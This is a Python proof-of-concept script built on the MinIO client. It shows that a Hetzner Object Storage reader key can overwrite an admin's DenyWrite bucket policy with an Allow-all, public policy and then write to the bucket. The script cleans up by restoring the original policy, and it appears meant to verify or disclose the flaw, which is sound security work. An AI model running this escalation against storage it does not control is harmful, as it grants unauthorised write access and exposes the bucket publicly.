"""Privilege escalation demo: reader key removes its own restrictions.

Demonstrates that a Hetzner Object Storage reader key can call
PutBucketPolicy to replace a DenyWrite policy with Allow-all,
then write freely. One API call for full escalation.

Two keys involved:
  - Admin key (S3_ACCESS_KEY) — applies the restriction
  - Reader key (S3_READER_ACCESS_KEY) — removes it

Required env vars: S3_ENDPOINT, S3_ACCESS_KEY, S3_SECRET_KEY,
S3_READER_ACCESS_KEY, S3_READER_SECRET_KEY, S3_DATA_PATH,
HETZNER_PROJECT_ID, S3_USE_SSL.
"""

import json
import os
import sys
import time
from io import BytesIO

from minio import Minio
from minio.error import S3Error


def env(name: str) -> str:
    val = os.environ.get(name)
    if not val:
        sys.exit(f"Missing env var: {name}")
    return val


def main():
    endpoint = env("S3_ENDPOINT")
    admin_key = env("S3_ACCESS_KEY")
    admin_secret = env("S3_SECRET_KEY")
    reader_key = env("S3_READER_ACCESS_KEY")
    reader_secret = env("S3_READER_SECRET_KEY")
    project_id = env("HETZNER_PROJECT_ID")
    use_ssl = os.environ.get("S3_USE_SSL", "false").lower() == "true"

    from urllib.parse import urlparse
    data_path = env("S3_DATA_PATH")
    parsed = urlparse(data_path)
    bucket = parsed.netloc if parsed.scheme in ("s3", "s3a") else data_path.split("/")[0]

    principal = f"arn:aws:iam:::user/p{project_id}:{reader_key}"
    admin = Minio(endpoint, admin_key, admin_secret, secure=use_ssl)
    reader = Minio(endpoint, reader_key, reader_secret, secure=use_ssl)

    test_key = "main/__escalation_test__"

    deny_write = {
        "Version": "2012-10-17",
        "Statement": [{
            "Sid": "DenyWrite",
            "Effect": "Deny",
            "Principal": {"AWS": principal},
            "Action": ["s3:PutObject", "s3:DeleteObject", "s3:AbortMultipartUpload"],
            "Resource": [f"arn:aws:s3:::{bucket}", f"arn:aws:s3:::{bucket}/*"],
        }],
    }

    # Save original policy for restore
    try:
        original_policy = admin.get_bucket_policy(bucket)
    except S3Error as e:
        if e.code == "NoSuchBucketPolicy":
            original_policy = None
        else:
            raise

    try:
        # 1. Admin applies DenyWrite policy
        print(f"1. Admin applies DenyWrite policy on '{bucket}'")
        admin.set_bucket_policy(bucket, json.dumps(deny_write))
        time.sleep(2)

        # 2. Reader confirms write is denied
        print("2. Reader tries to write — should be denied")
        try:
            reader.put_object(bucket, test_key, BytesIO(b"test"), 4)
            print("   UNEXPECTED: write succeeded")
            return
        except S3Error as e:
            print(f"   -> {e.code} (blocked as expected)")

        # 3. Reader replaces the policy (the escalation)
        print("3. Reader calls PutBucketPolicy to remove restrictions")
        allow_all = {
            "Version": "2012-10-17",
            "Statement": [{
                "Sid": "AllowAll",
                "Effect": "Allow",
                "Principal": "*",
                "Action": "s3:*",
                "Resource": [f"arn:aws:s3:::{bucket}", f"arn:aws:s3:::{bucket}/*"],
            }],
        }
        try:
            reader.set_bucket_policy(bucket, json.dumps(allow_all))
            time.sleep(2)
            print("   -> Succeeded — policy replaced")
        except S3Error as e:
            print(f"   -> {e.code} (denied — escalation not possible)")
            return

        # 4. Reader writes — proving escalation
        print("4. Reader tries to write again")
        try:
            reader.put_object(bucket, test_key, BytesIO(b"escalated"), 9)
            print("   -> Succeeded — full privilege escalation confirmed")
        except S3Error as e:
            print(f"   -> {e.code}")

    finally:
        # Clean up
        try:
            admin.remove_object(bucket, test_key)
        except S3Error:
            pass
        print("\nRestoring original policy...")
        try:
            if original_policy:
                admin.set_bucket_policy(bucket, original_policy)
            else:
                admin.delete_bucket_policy(bucket)
            print("Done.")
        except Exception as e:
            print(f"ERROR: {e}")
            if original_policy:
                print(f"Manual restore needed: {original_policy}")


if __name__ == "__main__":
    main()
